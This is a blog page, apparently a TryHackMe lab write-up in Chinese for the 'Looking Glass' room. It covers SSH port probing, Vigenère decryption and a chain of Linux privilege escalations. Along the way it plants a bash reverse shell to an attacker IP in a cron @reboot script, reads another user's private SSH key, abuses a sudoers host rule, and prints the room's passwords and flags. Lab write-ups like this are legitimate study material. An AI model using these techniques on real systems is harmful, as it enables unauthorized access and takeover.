@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0,  viewport-fit=cover" name="viewport" />
+    <meta name="description" content="Looking Glass" />
+    <meta name="hexo-theme-A4" content="v1.8.2" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>v2ish1yan</title>
+
+    
+        
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+    
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md>table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">v2ish1yan</a> 
+            <span class="description">一切都是兴趣使然</span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            Looking Glass
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="post-toc-text">0x01 端口扫描</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E8%A7%A3%E5%AF%86"><span class="post-toc-text">0x02 维吉尼亚解密</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E6%8F%90%E6%9D%83%E8%87%B3tweedledum"><span class="post-toc-text">0x03 提权至tweedledum</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x04-%E6%8F%90%E6%9D%83%E8%87%B3humptydumpty"><span class="post-toc-text">0x04 提权至humptydumpty</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x05-%E4%BD%BF%E7%94%A8ssh%E7%A7%81%E9%92%A5%E6%8F%90%E6%9D%83%E8%87%B3alice"><span class="post-toc-text">0x05 使用ssh私钥提权至alice</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x06-%E6%8F%90%E6%9D%83%E8%87%B3root"><span class="post-toc-text">0x06 提权至root</span></a></li></ol>
+            
+        
+        <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><ul>
+<li>linux提权</li>
+<li>维吉尼亚密码</li>
+</ul>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p>直接访问网址发现访问不了，尝试使用nmap扫一波端口</p>
+<pre><code class="bash">nmap -sC -sV   10.10.238.101 
+</code></pre>
+<ul>
+<li>-sC 使用默认脚本</li>
+<li>-sV 显示服务版本信息</li>
+</ul>
+<p>结果</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122053694.png" alt="image-20230112205335633"></p>
+<p>可以发现不仅22端口开了ssh服务，从9000到13783端口都有ssh服务</p>
+<p>尝试连接9001端口</p>
+<pre><code class="bash">ssh -p 9001 test@10.10.238.101 
+</code></pre>
+<p>如果出现下面的报错</p>
+<pre><code class="bash">Unable to negotiate with 10.10.238.101 port 9001: no matching host key type found. Their offer: ssh-rsa
+</code></pre>
+<p>就在&#x2F;etc&#x2F;ssh&#x2F;ssh_config下面加上<code>HostkeyAlgorithms +ssh-rsa</code></p>
+<p>会发现返回Lower</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122111046.png" alt="image-20230112211126993"></p>
+<p>那换一个大的端口呢</p>
+<pre><code class="bash">ssh -p 13783 test@10.10.238.101
+</code></pre>
+<p>会返回Higher</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122112320.png" alt="image-20230112211211293"></p>
+<p>这就很明显了，让我们找到对的端口来连接，就用二分法来找吧</p>
+<p>最后找到正确端口<code>10412</code></p>
+<p>也可以使用bash脚本进行</p>
+<pre><code class="bash">for i in $(seq 9000 13783); do echo &quot;connecting to port $i&quot;; ssh -o &#39;LogLevel=ERROR&#39; -o &#39;StrictHostKeyChecking=no&#39; -p $i test@10.10.2.112;done | grep -vE &#39;Lower|Higher&#39;
+</code></pre>
+<pre><code class="bash">#LogLevel=ERROR 设置安全等级为最低级，这样就不会显示报错消息
+#StrictHostKeyChecking=no  不检查密钥文件
+# -v 查找不包含目标字符串的内容  -E 使用 | 代表或
+</code></pre>
+<h2 id="0x02-维吉尼亚解密"><a href="#0x02-维吉尼亚解密" class="headerlink" title="0x02 维吉尼亚解密"></a>0x02 维吉尼亚解密</h2><p>他返回了下面的内容</p>
+<pre><code class="bash">You&#39;ve found the real service.
+Solve the challenge to get access to the box
+Jabberwocky
+&#39;Mdes mgplmmz, cvs alv lsmtsn aowil
+Fqs ncix hrd rxtbmi bp bwl arul;
+Elw bpmtc pgzt alv uvvordcet,
+Egf bwl qffl vaewz ovxztiql.
+
+&#39;Fvphve ewl Jbfugzlvgb, ff woy!
+Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
+Bplhrf xag Rjinlu imro, pud tlnp
+Bwl jintmofh Iaohxtachxta!&#39;
+
+Oi tzdr hjw oqzehp jpvvd tc oaoh:
+Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
+Hv rfwmgl wl fp moi Tfbaun xkgm,
+Puh jmvsd lloimi bp bwvyxaa.
+
+Eno pz io yyhqho xyhbkhe wl sushf,
+Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
+Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
+Pud cykdttk ej ba gaxt!
+
+Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
+Ewl vpvict qseux dine huidoxt-achgb!
+Al peqi pt eitf, ick azmo mtd wlae
+Lx ymca krebqpsxug cevm.
+
+&#39;Ick lrla xhzj zlbmg vpt Qesulvwzrr?
+Cpqx vw bf eifz, qy mthmjwa dwn!
+V jitinofh kaz! Gtntdvl! Ttspaj!&#39;
+Wl ciskvttk me apw jzn.
+
+&#39;Awbw utqasmx, tuh tst zljxaa bdcij
+Wph gjgl aoh zkuqsi zg ale hpie;
+Bpe oqbzc nxyi tst iosszqdtz,
+Eew ale xdte semja dbxxkhfe.
+Jdbr tivtmi pw sxderpIoeKeudmgdstd
+</code></pre>
+<p>Jabberwocky</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122125176.png" alt="image-20230112212524132"></p>
+<p>这个看起来就是将字符打乱了，可能是维基利亚密码，使用这个网站进行解密【他会自动爆破密钥】</p>
+<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">vigenere-solver</a></p>
+<p>得到密码<code>bewareTheJabberwock</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122127686.png" alt="image-20230112212709654"></p>
+<p>然后他会告诉我们用户和密码</p>
+<pre><code class="bash">jabberwock:SubjectsWatchingShynessProvided
+</code></pre>
+<pre><code class="bash">ssh jabberwock@10.10.238.101
+</code></pre>
+<p>进去后查看user.txt，得到</p>
+<pre><code class="bash">&#125;32a911966cab2d643f5d57d9e0173d56&#123;mht
+</code></pre>
+<p>将其逆序输出</p>
+<pre><code class="python">str=&#39;&#125;32a911966cab2d643f5d57d9e0173d56&#123;mht&#39;
+print(str[::-1])
+&gt;thm&#123;65d3710e9d75d5f346d2bac669119a23&#125;
+</code></pre>
+<h2 id="0x03-提权至tweedledum"><a href="#0x03-提权至tweedledum" class="headerlink" title="0x03 提权至tweedledum"></a>0x03 提权至tweedledum</h2><p>然后这里有两个文件<code>poem.txt</code>和<code>twasBrillig.sh</code>，这个脚本</p>
+<pre><code class="bash">wall $(cat /home/jabberwock/poem.txt)
+</code></pre>
+<p>就是用来输出诗句的</p>
+<p>然后再看看当前用户可以不用密码执行哪些其他用户的命令<code>sudo -l -l</code></p>
+<pre><code class="bash">Sudoers entry:                                                                                                                                                                                   
+    RunAsUsers: root                                                                                                                                                                             
+    Options: !authenticate                                                                                                                                                                       
+    Commands:                                                                                                                                                                                    
+        /sbin/reboot     
+</code></pre>
+<p>可以以root的身份执行重启命令，他为什么会给重启，可以去看看cron定时任务，可能会有相关信息</p>
+<p>查看<code>etc/crontab</code>，发现有这样一段指令</p>
+<pre><code class="bash">@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
+</code></pre>
+<p>没当机器重启的时候，就会以tweedledum的身份去执行<code>twasBrillig.sh</code>，我们可以修改这个脚本的内容，然后重启这个机器进行提权</p>
+<p><code>twasBrillig.sh</code>修改为反弹shell</p>
+<pre><code class="bash">bash -c &#39; bash -i &amp;&gt; /dev/tcp/10.18.104.32/9999 0&gt;&amp;1&#39;
+</code></pre>
+<p>然后执行命令</p>
+<pre><code class="bash">sudo -u root /sbin/reboot
+</code></pre>
+<p>来重启服务器</p>
+<p>攻击机开启监听，等一段时间后就可以得到shell</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122208657.png" alt="image-20230112220858586"></p>
+<h2 id="0x04-提权至humptydumpty"><a href="#0x04-提权至humptydumpty" class="headerlink" title="0x04 提权至humptydumpty"></a>0x04 提权至humptydumpty</h2><p>在<code>/home/tweedledum</code>发现了<code>humptydumpty.txt</code></p>
+<pre><code class="bash">dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
+7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
+28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
+b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
+fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
+b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+</code></pre>
+<p>貌似为hash值，使用这个网站进行解密<a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a>，得到</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122214270.png" alt="image-20230112221453208"></p>
+<p>最下面那个不是hash，用16进制解码一下，得到密码</p>
+<pre><code>the password is zyxwvutsrqponmlk
+</code></pre>
+<p>看来这个就是用户<code>humptydumpty</code>的密码了,切换用户</p>
+<pre><code class="bash">su humptydumpty
+</code></pre>
+<p>他会报错</p>
+<pre><code class="bash">su: must be run from a terminal
+</code></pre>
+<p>使用python的pty模块，执行以下命令，获取伪终端</p>
+<pre><code class="bash">python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<h2 id="0x05-使用ssh私钥提权至alice"><a href="#0x05-使用ssh私钥提权至alice" class="headerlink" title="0x05 使用ssh私钥提权至alice"></a>0x05 使用ssh私钥提权至alice</h2><p>alice用户的.ssh目录可以访问，虽然不能列出文件，但是可以打印alice的私钥文件<code>id_rsa</code></p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301122356285.png" alt="image-20230112235606214"></p>
+<p>复制到本地，保存在一个文件中，并赋予相应权限,只有</p>
+<pre><code class="bash">chmod 600 key
+</code></pre>
+<p>然后使用命令</p>
+<pre><code class="bash">ssh -i key alice@10.10.2.112 
+</code></pre>
+<p>来登录alice用户</p>
+<h2 id="0x06-提权至root"><a href="#0x06-提权至root" class="headerlink" title="0x06 提权至root"></a>0x06 提权至root</h2><p>使用linepeas.sh来找可能存在提权的地方，这个就攻击机开个服务，让目标机下载就行</p>
+<p>在<code>/etc/sudoers.d/alice</code>存在对alice的sudo规则,当<code>sudo -l</code>需要密码而不知道的时候可以看看这里的文件</p>
+<pre><code class="bash">alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
+</code></pre>
+<p>下面的是sudoers文件的语法</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301130009588.png" alt="img"></p>
+<p>这里说明alice只能在ssalg-gnikool主机上才能使用root用户执行&#x2F;bin&#x2F;bash</p>
+<p>使用命令</p>
+<pre><code class="bash">sudo -h  ssalg-gnikool -u root /bin/bash
+</code></pre>
+<p>-h 可以指定主机</p>
+<p>虽然没有解析成功，但是还是到了root权限</p>
+<p><img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202301130013202.png" alt="image-20230113001330163"></p>
+<p>最后在&#x2F;root得到root.txt，还是要逆序一下</p>
+<pre><code class="python">str=&#39;&#125;f3dae6dec817ad10b750d79f6b7332cb&#123;mht&#39;
+print(str[::-1])
+&gt;thm&#123;bc2337b6f97d057b01da718ced6ead3f&#125;
+</code></pre>
+
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2023-07-03</span>
+            
+                <span>该篇文章被 v2ish1yan</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/Linux/'>
+                            Linux
+                        </a>
+                    
+                        <a href='/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/'>
+                            维吉尼亚密码
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/Tryhackme/'>
+                            Tryhackme
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+   
+    
+<script src="/js/highlight.min.js"></script>
+
+    
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
